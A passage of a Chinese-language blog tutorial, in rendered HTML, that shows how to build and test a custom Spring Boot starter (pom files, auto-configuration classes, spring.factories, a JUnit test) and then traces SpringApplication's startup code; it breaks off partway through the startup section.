class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>创建4个文件：<ul><li><code>com/lun/hello/auto/HelloServiceAutoConfiguration</code></li><li><code>com/lun/hello/bean/HelloProperties</code></li><li><code>com/lun/hello/service/HelloService</code></li><li><code>src/main/resources/META-INF/spring.factories</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.bean.HelloProperties;<br><span class="hljs-keyword">import</span> com.lun.hello.service.HelloService;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;<br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ConditionalOnMissingBean(HelloService.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(HelloProperties.class)</span><span class="hljs-comment">//默认HelloProperties放在容器中</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServiceAutoConfiguration</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> HelloService <span class="hljs-title function_">helloService</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloService</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><br><span class="hljs-meta">@ConfigurationProperties(&quot;hello&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloProperties</span> &#123;<br>    <span class="hljs-keyword">private</span> String prefix;<br>    <span class="hljs-keyword">private</span> String suffix;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPrefix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> prefix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrefix</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-built_in">this</span>.prefix = prefix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSuffix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> suffix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSuffix</span><span class="hljs-params">(String suffix)</span> &#123;<br>        <span class="hljs-built_in">this</span>.suffix = suffix;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.bean.HelloProperties;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 默认不要放在容器中</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> HelloProperties helloProperties;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String userName)</span>&#123;<br>        <span class="hljs-keyword">return</span> helloProperties.getPrefix() + <span class="hljs-string">&quot;: &quot;</span> + userName + <span class="hljs-string">&quot; &gt; &quot;</span> + helloProperties.getSuffix();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># Auto Configure</span><br><span class="hljs-attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="hljs-string">\</span><br><span class="hljs-string">com.lun.hello.auto.HelloServiceAutoConfiguration</span><br></code></pre></td></tr></table></figure><ul><li><p>用maven插件，将两工程install到本地。</p></li><li><p>接下来，测试使用自定义starter，用Spring Initializr创建名为<code>hello-spring-boot-starter-test</code>工程，引入<code>hello-spring-boot-starter</code>依赖，其pom.xml如下：</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hello-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 引入`hello-spring-boot-starter`依赖 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>添加配置文件<code>application.properties</code>：</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">hello.prefix</span>=<span class="hljs-string">hello</span><br><span class="hljs-attr">hello.suffix</span>=<span class="hljs-string">666</span><br></code></pre></td></tr></table></figure><ul><li>添加单元测试类：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.service.HelloService;<span class="hljs-comment">//来自自定义starter</span><br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Assertions;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloSpringBootStarterTestApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> HelloService helloService;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// System.out.println(helloService.sayHello(&quot;lun&quot;));</span><br>        Assertions.assertEquals(<span class="hljs-string">&quot;hello: lun &gt; 666&quot;</span>, helloService.sayHello(<span class="hljs-string">&quot;lun&quot;</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="84、原理解析-SpringApplication创建初始化流程"><a href="#84、原理解析-SpringApplication创建初始化流程" class="headerlink" title="84、原理解析-SpringApplication创建初始化流程"></a>84、原理解析-SpringApplication创建初始化流程</h2><h3 id="SpringBoot启动过程"><a href="#SpringBoot启动过程" class="headerlink" title="SpringBoot启动过程"></a>SpringBoot启动过程</h3><p>Spring Boot应用的启动类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloSpringBootStarterTestApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(HelloSpringBootStarterTestApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplication</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt; primarySource, String... args)</span> &#123;<br><span class="hljs-keyword">return</span> run(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[] &#123; primarySource &#125;, args);<br>&#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplication</span>(primarySources).run(args);<br>&#125;<br>    <br>    <span class="hljs-comment">//先看看new SpringApplication(primarySources)，下一节再看看run()</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringApplication</span><span class="hljs-params">(Class&lt;?&gt;... primarySources)</span> &#123;<br><span class="hljs-built_in">this</span>(<span class="hljs-literal">null</span>, primarySources);<br>&#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringApplication</span><span class="hljs-params">(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources)</span> &#123;<br><span class="hljs-built_in">this</span>.resourceLoader = resourceLoader;<br>Assert.notNull(primarySources, <span class="hljs-string">&quot;PrimarySources must not be null&quot;</span>);<br><span class="hljs-built_in">this</span>.primarySources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;(Arrays.asList(primarySources));<br>        <span class="hljs-comment">//WebApplicationType是枚举类，有NONE,SERVLET,REACTIVE,下行webApplicationType是SERVLET</span><br><span class="hljs-built_in">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();<br>        <br>        <span class="hljs-comment">//初始启动引导器，去spring.factories文件中找org.springframework.boot.Bootstrapper，但我找不到实现Bootstrapper接口的类</span><br><span class="hljs-built_in">this</span>.bootstrappers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(getSpringFactoriesInstances(Bootstrapper.class));<br><br>        <span class="hljs-comment">//去spring.factories找 ApplicationContextInitializer</span><br>        setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));<br><br>        <span class="hljs-comment">//去spring.factories找 ApplicationListener</span><br>        setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));<br><br>        <span class="hljs-built_in">this</span>.mainApplicationClass = deduceMainApplicationClass();<br>&#125;<br> <br>    <span class="hljs-keyword">private</span> Class&lt;?&gt; deduceMainApplicationClass() &#123;<br><span class="hljs-keyword">try</span> &#123;<br>StackTraceElement[] stackTrace = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>().getStackTrace();<br><span class="hljs-keyword">for</span> (StackTraceElement stackTraceElement : stackTrace) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;main&quot;</span>.equals(stackTraceElement.getMethodName())) &#123;<br><span class="hljs-keyword">return</span> Class.forName(stackTraceElement.getClassName());<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br><span class="hljs-comment">// Swallow and continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>spring.factories：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">...</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># Application Context Initializers</span><br><span class="hljs-attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.context.ContextIdApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.context.config.DelegatingApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.rsocket.context.RSocketPortInfoApplicationContextInitializer,\</span><br><span class="hljs-string">org.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># Application Listeners</span><br><span class="hljs-attr">org.springframework.context.ApplicationListener</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.ClearCachesApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.builder.ParentContextCloserApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.FileEncodingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.config.AnsiOutputApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.config.DelegatingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.context.logging.LoggingApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.env.EnvironmentPostProcessorApplicationListener,\</span><br><span class="hljs-string">org.springframework.boot.liquibase.LiquibaseServiceLocatorApplicationListener</span><br><br><span class="hljs-attr">...</span><br><br></code></pre></td></tr></table></figure><h2 id="85、原理解析-SpringBoot完整启动过程"><a href="#85、原理解析-SpringBoot完整启动过程" class="headerlink" title="85、原理解析-SpringBoot完整启动过程"></a>85、原理解析-SpringBoot完整启动过程</h2><p>继续上一节，接着讨论<code>return new SpringApplication(primarySources).run(args)</code>的<code>run</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 